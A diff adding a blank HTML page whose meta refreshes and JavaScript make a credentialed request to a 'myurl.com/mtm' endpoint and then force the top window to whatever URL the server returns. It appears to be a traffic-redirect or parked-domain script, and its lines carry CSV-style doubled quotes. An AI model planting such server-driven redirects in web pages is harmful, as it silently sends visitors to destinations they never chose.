@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+"<html lang=""en"">"
+<head>
+"<meta charset=""UTF-8"">"
+"<meta http-equiv=""x-ua-compatible"" content=""IE=edge"">"
+"<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">"
+<title></title>
+<noscript>
+"<meta http-equiv=""refresh"" content=""0;url=http://myurl.com/mtm/direct/.eJwliksKgDAMBe-SZZF272WkhvhB08prK4h4dyPuZoa5qWGlnsIoiReN2DyXkzqKmIt1I8gkEPyy5FKHFFVM9WrYPWf9dmY5qkUXHD0vsMwbBg:1p9oX7:Fve4PqfDyH_zFRnuIiyc319uq_8/2"" />"
+</noscript>
+"<meta http-equiv=""refresh"" content=""35;url=http://myurl.com/mtm/direct/.eJwliksKgDAMBe-SZZF272WkhvhB08prK4h4dyPuZoa5qWGlnsIoiReN2DyXkzqKmIt1I8gkEPyy5FKHFFVM9WrYPWf9dmY5qkUXHD0vsMwbBg:1p9oX7:Fve4PqfDyH_zFRnuIiyc319uq_8/0"" />"
+</head>
+"<body onload=""do_onload()"">"
+"<script type=""text/javascript"">"
+function tmr(path) {
+return function() {
+"window.top.location.href = ""http://myurl.com/mtm/direct/.eJwliksKgDAMBe-SZZF272WkhvhB08prK4h4dyPuZoa5qWGlnsIoiReN2DyXkzqKmIt1I8gkEPyy5FKHFFVM9WrYPWf9dmY5qkUXHD0vsMwbBg:1p9oX7:Fve4PqfDyH_zFRnuIiyc319uq_8/"" + path + ""/"";"
+}
+}
+"var tmrR = setTimeout(tmr(3), 3000);"
+"var p = "".eJwliksKgDAMBe-SZZF272WkhvhB08prK4h4dyPuZoa5qWGlnsIoiReN2DyXkzqKmIt1I8gkEPyy5FKHFFVM9WrYPWf9dmY5qkUXHD0vsMwbBg:1p9oX7:Fve4PqfDyH_zFRnuIiyc319uq_8"", as = ""http://myurl.com/mtm/async/"";"
+function d(n) {
+"window.top.location.href = ""http://www42.myurl.com/"" + n;"
+}
+function ar(r) {
+"if (r.slice(0, 1) !== ""."") {"
+try {
+window.top.location.assign(r);
+} catch (err) {
+}
+try {
+"var mar = document.createElement(""meta"");"
+"mar.httpEquiv = ""refresh"";"
+"mar.content = ""0;url="" + r;"
+"document.getElementsByTagName(""head"")[0].appendChild(mar);"
+} catch (err) {
+}
+} else {
+"var s = document.createElement(""span"");"
+"s.id = ""ecode"";"
+s.appendChild(document.createTextNode(r.slice(1)));
+"document.getElementsByTagName(""body"")[0].appendChild(s);"
+}
+}
+function print(msg) {
+"document.getElementsByTagName(""body"")[0].appendChild(document.createTextNode(msg));"
+}
+function do_onload() {
+clearTimeout(tmrR);
+"tmrR = setTimeout(tmr(5), 15000);"
+"if (""fetch"" in window) {"
+try {
+"fetch(as + p + ""/1/"", {"
+"credentials: ""include"""
+}).then(function (r) {
+if (!r.ok) {
+"throw Error(""50x"");"
+}
+return r.text();
+}).then(function (r) {
+ar(r);
+});
+} catch (err) {
+d(2);
+}
+} else {
+try {
+var x = new XMLHttpRequest();
+"x.open(""GET"", as + p + ""/2/"", false);"
+x.onerror = function () {
+d(3);
+};
+x.onload = function () {
+if (x.status === 200) {
+ar(x.responseText);
+} else {
+d(4);
+}
+};
+x.onreadystatechange = function (r) {
+if (x.readyState === 4) {
+if (x.status === 200) {
+ar(x.responseText);
+} else {
+d(6);
+}
+}
+};
+x.send();
+} catch (err) {
+d(5);
+}
+}
+}
+</script>
+</body>
+</html>
